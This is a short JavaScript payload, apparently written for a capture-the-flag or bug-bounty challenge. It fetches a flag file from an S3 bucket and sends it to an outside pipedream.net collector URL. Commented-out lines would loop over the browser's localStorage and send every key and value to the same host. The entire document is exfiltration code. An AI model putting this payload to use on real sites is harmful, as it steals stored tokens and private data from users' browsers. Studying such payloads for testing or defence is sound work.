async function getFlag() {
            // var local_length = window.localStorage.length;
            var link = "https://bugbase-secret-file-storage.s3.ap-northeast-2.amazonaws.com/flag.txt"
            var flag = await fetch(link)
            fetch('https://eoctl0knzoys9l9.m.pipedream.net/localstroge/flag/' + flag);
            // for (let i = 0; i < local_length; i++) {
                // fetch('https://eoctl0knzoys9l9.m.pipedream.net/localstroge/key/' + window.localStorage.key(i));
                // fetch('https://eoctl0knzoys9l9.m.pipedream.net/localstroge/value/' + window.localStorage.getItem(window.localStorage.key(i)));
            // }

        }
        getFlag()
